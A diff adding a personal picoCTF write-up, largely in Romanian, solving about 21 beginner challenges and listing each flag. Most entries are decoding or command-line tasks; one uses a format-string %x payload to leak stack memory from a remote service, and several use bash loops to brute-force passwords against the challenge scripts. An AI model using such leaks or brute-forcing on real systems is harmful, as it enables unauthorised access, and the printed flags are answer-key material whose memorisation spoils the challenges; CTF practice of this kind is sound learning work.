@@ -1,0 +1,272 @@
+#picoCTF
+
+
+1.Transformation 
+Prima incercare a fost sa bag continutul fisierului intr-un translator online insa textul nu avea sens.
+#The ord() function returns an integer representing the Unicode character.(https://www.programiz.com/python-programming/methods/built-in/ord)
+#The chr() method converts an integer to its unicode character and returns it.(https://www.programiz.com/python-programming/methods/built-in/chr)
+''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
+din codul dat de problema pare ca biti flagului(care cel mai probabil este array-ul de char introdus) sunt shiftati cu 8 la stanga(il multiplica cu 2 la puterea 8) apoi adunati cu valoarea 
+x="灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彤㔲挶戹㍽"
+for i in range(0,len(x),1): print(ord(x[i]))
+ # am facut urmatoarul loop in bash in python3 pentru a vedea valoarea unicod a tuturor caracterelor din document
+output:
+28777
+25455
+17236
+18043
+12598
+24418
+26996
+29535
+26990
+29556
+13108
+25695
+28518
+24376
+24420
+13618
+25398
+25145
+13181
+Am incercat sa fac o functie in python care sa faca procesul invers insa rezultatul nu a fost bun
+x=open("enc").read()
+>>> print(hex(ord(x[0])))
+0x7069 ===CONVERTOR HEX TO ASCII==> pi
+>>> for c in x:
+...     print(hex(ord(c)).lstrip("0x"),end='')
+... 
+output:7069636f4354467b31365f626974735f696e73743334645f6f665f385f64353263366239337d
+convertita din hex in ascii =>
+picoCTF{16_bits_inst34d_of_8_d52c6b93}
+
+2.Stonks
+#zona in care utilizatorul are acces este cea de scanf
+char *user_buf = malloc(300 + 1);
+	printf("What is your API token?\n");
+	scanf("%300s", user_buf);
+	printf("Buying stonks with token:\n");
+	printf(user_buf);
+#codul foloseste un printf pe un string nesecurizat deci se pot trimite parametrii specifici % pentru a sustrage date
+#ruland comanda nc mercury.picoctf.net 6989
+1
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+#extragem date din stack in hexa, decodificate observam o secventa asemanatoare cu un flag ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3
+#il rearanjam folosind urmatorul loop
+>>> for i in range(0,len(s),4):
+...     print(s[i+3]+s[i+2]+s[i+1]+s[i],end='')
+... 
+output: picoCTF{I_l05t_4ll_my_m0n3y_0a853e52
+
+3.Static ain't always noise
+chmod +x ltdis.sh 
+./ltdis.sh static 
+cat static.ltdis.strings.txt |grep "pico"
+1020 picoCTF{d15a5m_t34s3r_6f8c8200}
+
+4.Tab, Tab, Attack
+cd Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/
+./fang-of-haynekhtnamet
+output: *ZAP!* picoCTF{l3v3l_up!_t4k3_4_r35t!_2bcfb2ab}
+
+5.Magikarp Ground Mission
+
+ssh ctf-player@venus.picoctf.net -p 50716
+ctf-player@pico-chall$ ls
+1of3.flag.txt  instructions-to-2of3.txt
+ctf-player@pico-chall$ cat 1of3.flag.txt 
+picoCTF{xxsh_
+ctf-player@pico-chall$ cat instructions-to-2of3.txt \
+> ^C
+ctf-player@pico-chall$ cat instructions-to-2of3.txt
+Next, go to the root of all things, more succinctly `/`
+ctf-player@pico-chall$ cd ~
+ctf-player@pico-chall$ ls
+3of3.flag.txt  drop-in
+ctf-player@pico-chall$ cat 3of3.flag.txt 
+71be5264}
+ctf-player@pico-chall$ cat drop-in/
+cat: drop-in/: Is a directory
+ctf-player@pico-chall$ ^C
+ctf-player@pico-chall$ cd drop-in/
+ctf-player@pico-chall$ ls
+1of3.flag.txt  instructions-to-2of3.txt
+ctf-player@pico-chall$ ls
+1of3.flag.txt  instructions-to-2of3.txt
+ctf-player@pico-chall$ cd ./
+ctf-player@pico-chall$ ls
+1of3.flag.txt  instructions-to-2of3.txt
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ ls
+3of3.flag.txt  drop-in
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ ls
+ctf-player
+ctf-player@pico-chall$ cat ctf-player/
+cat: ctf-player/: Is a directory
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ ls
+2of3.flag.txt  boot  etc   instructions-to-3of3.txt  lib64  mnt  proc  run   srv  tmp  var
+bin	       dev   home  lib			     media  opt  root  sbin  sys  usr
+ctf-player@pico-chall$ cat 2of3.flag.txt 
+0ut_0f_\/\/4t3r_
+ctf-player@pico-chall$ Connection to venus.picoctf.net closed by remote host.
+Connection to venus.picoctf.net closed.
+=> picoCTF{xxsh_0ut_0f_\/\/4t3r_71be5264}
+
+6.Warmed Up
+picoCTF{61}
+
+7.2Warm
+picoCTF{101010}
+
+8.strings it
+strings strings| grep "pico"
+picoCTF{5tRIng5_1T_d66c7bb7}
+
+9.Bases
+touch base64.txt
+gedit base64.txt
+#bDNhcm5fdGgzX3IwcDM1
+base64 -d base64.txt
+output:l3arn_th3_r0p35
+=>picoCTF{l3arn_th3_r0p35}
+10. First Grep
+cat file| grep "pico"
+output:picoCTF{grep_is_good_to_find_things_f77e0797}
+
+11.Codebook
+chmod +x code.py
+python3 code.py
+output: picoCTF{c0d3b00k_455157_197a982c}
+12.convertme.py
+If 63 is in decimal base, what is it in binary base?
+Answer: 111111
+That is correct! Here's your flag: picoCTF{4ll_y0ur_b4535_9c3b7d4d}
+
+13.fixme1.py
+#modified: 
+flag = str_xor(flag_enc, 'enkidu')
+print(flag)
+##
+output:picoCTF{1nd3nt1ty_cr1515_182342f7}\
+
+14.fixme2.py
+# == la if
+picoCTF{3qu4l1ty_n0t_4551gnm3nt_e8814d03}
+15.Glitch Cat
+erick@erick-VirtualBox:~/Downloads$  nc saturn.picoctf.net 51109
+'picoCTF{gl17ch_m3_n07_' + chr(0x62) + chr(0x64) + chr(0x61) + chr(0x36) + chr(0x38) + chr(0x66) + chr(0x37) + chr(0x35) + '}'
+^C
+erick@erick-VirtualBox:~/Downloads$ python3
+Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 'picoCTF{gl17ch_m3_n07_' + chr(0x62) + chr(0x64) + chr(0x61) + chr(0x36) + chr(0x38) + chr(0x66) + chr(0x37) + chr(0x35) + '}'
+'picoCTF{gl17ch_m3_n07_bda68f75}'
+
+
+16. HashingJobApp
+erick@erick-VirtualBox:~/Downloads$ nc saturn.picoctf.net 57689
+Please md5 hash the text between quotes, excluding the quotes: 'Hawaii'
+Answer: 
+a85df3d66bde576d3b62caaf527f2daa
+a85df3d66bde576d3b62caaf527f2daa
+Correct.
+Please md5 hash the text between quotes, excluding the quotes: ''
+Answer: 
+d41d8cd98f00b204e9800998ecf8427e
+d41d8cd98f00b204e9800998ecf8427e
+Correct.
+Please md5 hash the text between quotes, excluding the quotes: 'Michele Pfeifer'
+Answer: 
+5aa67b1e7680114db194886efc6967c2
+5aa67b1e7680114db194886efc6967c2
+Correct.
+picoCTF{4ppl1c4710n_r3c31v3d_3eb82b73}
+
+17.PW Crack 1
+cat level1.py
+#parola este trecuta in clar in cod intr-un if : "if( user_pw == "1e1a"):"
+python3 level1.py 
+Please enter correct password for flag: 1e1a
+Welcome back... your flag, user:
+picoCTF{545h_r1ng1ng_fa343060}
+18.PW Crack 2
+cat level2.py
+#verificarea parolei se face intr-un if :"if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):"
+#am copiat secventa si am executat-o in python3
+>>> x=chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)
+>>> print(x)
+39ce
+# apoi am folosit rezultatul pentru parola 
+python3 level2.py 
+Please enter correct password for flag: 39ce
+Welcome back... your flag, user:
+picoCTF{tr45h_51ng1ng_502ec42e}
+
+
+19.PW Crack 3
+ 	cat level3.py
+	observam lista de parole posibile:pos_pw_list=("6997" "3ac8" "f0ac" "4b17" "ec27" "4e66" "865e")
+	am facut un script care sa testeze toate parolele
+ 	
+	#! /bin/bash
+	pos_pw_list=("6997" "3ac8" "f0ac" "4b17" "ec27" "4e66" "865e")
+	for(( i=0; i<${#pos_pw_list[@]};i++)) {
+		echo ${pos_pw_list[i]}|python3 level3.py
+	}
+
+
+output:
+Please enter correct password for flag: That password is incorrect
+Please enter correct password for flag: That password is incorrect
+Please enter correct password for flag: That password is incorrect
+Please enter correct password for flag: Welcome back... your flag, user:
+picoCTF{m45h_fl1ng1ng_2b072a90}
+Please enter correct password for flag: That password is incorrect
+Please enter correct password for flag: That password is incorrect
+Please enter correct password for flag: That password is incorrect
+./script.sh |grep "pico"
+output:picoCTF{m45h_fl1ng1ng_2b072a90}
+
+20.PW Crack 4
+	cat level4.py
+	observam lista de parole:pos_pw_list=("158f" "1655" "d21e" "4966" "ed69" "1010" "dded" "844c" "40ab" "a948" "156c" "ab7f" "4a5f" "e38c" "ba12" "f7fd" "d780" "4f4d" "5ba1" "96c5" "55b9" "8a67" "d32b" "aa7a" "514b" "e4e1" "1230" "cd19" "d6dd" "b01f" "fd2f" "7587" "86c2" "d7b8" "55a2" "b77c" "7ffe" "4420" "e0ee" "d8fb" "d748" "b0fe" "2a37" "a638" "52db" "51b7" "5526" "40ed" "5356" "6ad4" "2ddd" "177d" "84ae" "cf88" "97a3" "17ad" "7124" "eff2" "e373" "c974" "7689" "b8b2" "e899" "d042" "47d9" "cca9" "ab2a" "de77" "4654" "9ecb" "ab6e" "bb8e" "b76b" "d661" "63f8" "7095" "567e" "b837" "2b80" "ad4f" "c514" "ffa4" "fc37" "7254" "b48b" "d38b" "a02b" "ec6c" "eacc" "8b70" "b03e" "1b36" "81ff" "77e4" "dbe6" "59d9" "fd6a" "5653" "8b95" "d0e5") 
+	folosim acelasi script de la 19 dar schimbam lista de parole
+	./script.sh |grep "pico"
+	output:picoCTF{fl45h_5pr1ng1ng_cf341ff1}
+21.PW Crack 5
+	#! /bin/bash
+
+
+	#pos_pw_list=("158f" "1655" "d21e" "4966" "ed69" "1010" "dded" "844c" "40ab" "a948" "156c" "ab7f" "4a5f" "e38c" "ba12" "f7fd" "d780" "4f4d" "5ba1" "96c5" "55b9" "8a67" "d32b" "aa7a" "514b" "e4e1" "1230" "cd19" "d6dd" "b01f" "fd2f" "7587" "86c2" "d7b8" "55a2" "b77c" "7ffe" "4420" "e0ee" "d8fb" "d748" "b0fe" "2a37" "a638" "52db" "51b7" "5526" "40ed" "5356" "6ad4" "2ddd" "177d" "84ae" "cf88" "97a3" "17ad" "7124" "eff2" "e373" "c974" "7689" "b8b2" "e899" "d042" "47d9" "cca9" "ab2a" "de77" "4654" "9ecb" "ab6e" "bb8e" "b76b" "d661" "63f8" "7095" "567e" "b837" "2b80" "ad4f" "c514" "ffa4" "fc37" "7254" "b48b" "d38b" "a02b" "ec6c" "eacc" "8b70" "b03e" "1b36" "81ff" "77e4" "dbe6" "59d9" "fd6a" "5653" "8b95" "d0e5")
+	l=$(cat dictionary.txt|wc -l)
+	j=0
+	while read -r line; 
+	do
+	pos_pw_list[j]=$line
+	#echo ${pos_pw_list[j]}
+	j=$j+1
+	done < dictionary.txt
+
+	#for(( i=0; i<${#pos_pw_list[@]};i++)) {
+	for(( i=0; i<$l;i++)) {
+	#echo "${pos_pw_list[i]} is working"
+	#echo ${pos_pw_list[i]}
+	echo ${pos_pw_list[i]}|python3 level5.py
+
+	#expect "Please enter correct password for flag: \r"
+	#send --"${pos_pw_list[i]}\r"	
+	#expect eof
+
+	}
+
+	picoCTF{h45h_sl1ng1ng_40f26f81}
+
+
+
+
+
+
